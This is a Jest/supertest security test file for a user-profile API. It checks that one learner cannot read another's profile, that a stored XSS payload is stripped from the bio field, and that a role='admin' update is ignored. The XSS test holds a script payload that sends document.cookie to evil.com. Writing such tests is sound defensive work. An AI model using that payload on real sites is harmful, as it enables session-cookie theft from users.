const request = require('supertest');
const mongoose = require('mongoose');
const app = require('../src/app');
const User = require('../src/models/User');
const jwt = require('jsonwebtoken');

describe('User Routes Security Tests', () => {
  let learnerA_Token, learnerB_Token;
  let learnerA_Id, learnerB_Id;

  beforeAll(async () => {
    // Connect to test db (or use existing connection, depending on setup)
    await mongoose.connect(process.env.MONGO_URI || 'mongodb://localhost:27017/skillswap_test');
    
    // Clear users
    await User.deleteMany({});

    // Create Learner A
    const learnerA = new User({
      email: 'learnerA@example.com',
      password_hash: 'hashedpassword',
      role: 'learner'
    });
    await learnerA.save();
    learnerA_Id = learnerA._id.toString();
    learnerA_Token = jwt.sign({ id: learnerA_Id }, process.env.JWT_SECRET || 'test_secret');

    // Create Learner B
    const learnerB = new User({
      email: 'learnerB@example.com',
      password_hash: 'hashedpassword',
      role: 'learner'
    });
    await learnerB.save();
    learnerB_Id = learnerB._id.toString();
    learnerB_Token = jwt.sign({ id: learnerB_Id }, process.env.JWT_SECRET || 'test_secret');
  });

  afterAll(async () => {
    await mongoose.connection.close();
  });

  describe('IDOR Protection', () => {
    it('Learner A cannot GET Learner B profile', async () => {
      // Learner A tries to fetch Learner B's profile
      const res = await request(app)
        .get(`/api/users/${learnerB_Id}/profile`)
        .set('Authorization', `Bearer ${learnerA_Token}`);
      
      // Should return 403 Forbidden
      expect(res.statusCode).toBe(403);
      expect(res.body.msg).toBe('Forbidden: You can only view your own profile');
    });

    it('Learner A can GET their own profile', async () => {
      const res = await request(app)
        .get(`/api/users/${learnerA_Id}/profile`)
        .set('Authorization', `Bearer ${learnerA_Token}`);
      
      expect(res.statusCode).toBe(200);
      expect(res.body.email).toBe('learnerA@example.com');
    });
  });

  describe('Stored XSS Prevention', () => {
    it('XSS payload in bio is stripped before storage', async () => {
      const xssPayload = "<script>fetch('https://evil.com?c='+document.cookie)</script>Clean bio";
      const res = await request(app)
        .patch('/api/users/profile')
        .set('Authorization', `Bearer ${learnerA_Token}`)
        .send({ bio: xssPayload });

      expect(res.statusCode).toBe(200);
      // Script tag must not appear in the stored value
      expect(res.body.bio).not.toContain('<script>');
      expect(res.body.bio).not.toContain('document.cookie');
    });
  });

  describe('Privilege Escalation Protection', () => {
    it('Sending role="admin" in profile update should be silently ignored (mass assignment prevention)', async () => {
      const res = await request(app)
        .patch('/api/users/profile')
        .set('Authorization', `Bearer ${learnerA_Token}`)
        .send({ role: 'admin', bio: 'My new bio' });
      
      expect(res.statusCode).toBe(200);
      
      // Check that bio was updated
      expect(res.body.bio).toBe('My new bio');
      
      // Check that role was NOT updated (still learner)
      // Since our endpoint strips role, it might not return it if we only return updated user,
      // but let's query the DB directly to be absolutely sure.
      const updatedUser = await User.findById(learnerA_Id);
      expect(updatedUser.role).toBe('learner');
    });
  });
});
